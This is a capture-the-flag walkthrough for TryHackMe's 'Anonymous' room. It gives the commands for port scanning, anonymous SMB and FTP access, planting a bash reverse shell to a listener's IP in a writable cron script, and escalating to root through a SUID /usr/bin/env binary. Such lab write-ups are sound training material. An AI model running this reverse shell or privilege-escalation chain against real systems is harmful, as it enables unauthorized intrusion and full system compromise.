# [Anonymous](https://github.com/Kevinovitz/TryHackMe_Writeups/tree/main/anonymous)

In [this](https://tryhackme.com/room/anonymous) room we use our basic Linux and PrivEsc knowledge to gain access to our machine and get root permissions.

More details [here](https://stawm.design.blog/2020/05/21/anonymous-thm-writeup/).

## Pwn

This guide contains the answer and steps necessary to get to them for the [Anonymous](https://tryhackme.com/room/) room. This room is similar to some other room, but I can't remember the name at the moment.

1. Enumerate the machine.  How many ports are open?

   We first scan the machine for any open ports with the following command:
   
   ```cmd
   nmap -sV 10.10.147.121
   ```

2. What service is running on port 21?

   This answer can be found in the previous image.

3. What service is running on ports 139 and 445?

   Both these answers can be seen in the previous image above.

4. There's a share on the user's computer.  What's it called?

   We can use smbclient to identify the shares available on the target machine.
   
   ```cmd
   smbclient -NL //10.10.11.32
   ```
   
   ![Smb Shares](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/anonymous/pwn_Smb_Shares.png)
      
   To view the contents of this share we can use:
   
   ```cmd
   smbclient -N //10.10.11.32/pics
   ```
   
   ![Smb Share](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/anonymous/pwn_Nmap_Smb.png)

   After going through these files, it appears they are just images of some dogs, which have no further use.

5. user.txt

   From the nmap scan we found we could connect to the machine through anonymous ftp.
   
   ```cmd
   ftp 10.10.75.132
   ```
   
   ![FTP Log In](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/anonymous/pwn_Ftp_Log_In.png)
   
   Looking through the files we see three files in a scripts folder which may be of interest.
   
   ![FTP Files](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/anonymous/pwn_Ftp_Files.png)
   
   We can download them all to our machine to investigate with `mget *`.
   
   ![FTP Download Files](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/anonymous/pwn_Ftp_Download.png)
   
   Looks like the `clean.sh` file is a script that runs periodically to remove some files. This gets stored in the log file. We also note that we have write access to this script. 
   
   ![Removed Files Log](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/anonymous/pwn_Removed_Files_Log.png)
   
   Lets find a command for a reverse shell we can add to this files. We can use [pentestmonkeys](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) for this.
   
   ![Reverse Shell Command](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/anonymous/pwn_Reverse_Shell_Command.png)
   
   We can now append this to the script we downloaded.
   
   ```cmd
   bash -i >& /dev/tcp/10.18.78.136/1337 0>&1
   ```
   
   ![Finished Script](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/anonymous/pwn_Finished_Script.png)
   
   Now all we have to do, is upload the file to the server. Set up a listener and wait for the script to run.
   
   ```cmd
   put clean.sh
   ```
   
   ![FTP Upload](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/anonymous/pwn_Ftp_Upload.png)
   
   We can check if the command was added using:
   
   ```cmd
   curl ftp://10.10.75.132/scripts/clean.sh
   ```
   
   ![Check Script](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/anonymous/pwn_Check_Script.png)
   
   Now we setup the listener and wait for the incoming connection to be made.
   
   ```cmd
   nc -nlvp 1337
   ```
   
   ![Reverse Shell](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/anonymous/pwn_Nmap_Reverse_Shell.png)
   
   Now it is time to navigate to the flag and read its contents.

6. root.txt

   In order for us to gain root on this machine we can look for any binaries which have their SUID bit set. 
   
   ```cmd
   find / -perm -4000 2>/dev/null
   ```
   
   ![Shell SUID](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/anonymous/pwn_Shel_SUID.png)
   
   We can use GTFOBins to look for any binaries which don't need sudo or a password. From this list we can use `/usr/bin/env`.
   
   ![GTFO](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/anonymous/pwn_GTFO.png)
   
   Now we can use this command to get root access on the machine.
   
   ```cmd
   /usr/bin/env bin/bash -p
   ```
   
   ![Root](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/anonymous/pwn_Root.png)
   
   After a quick check to verify we are indeed root, we can look at the contents of `root.txt`.
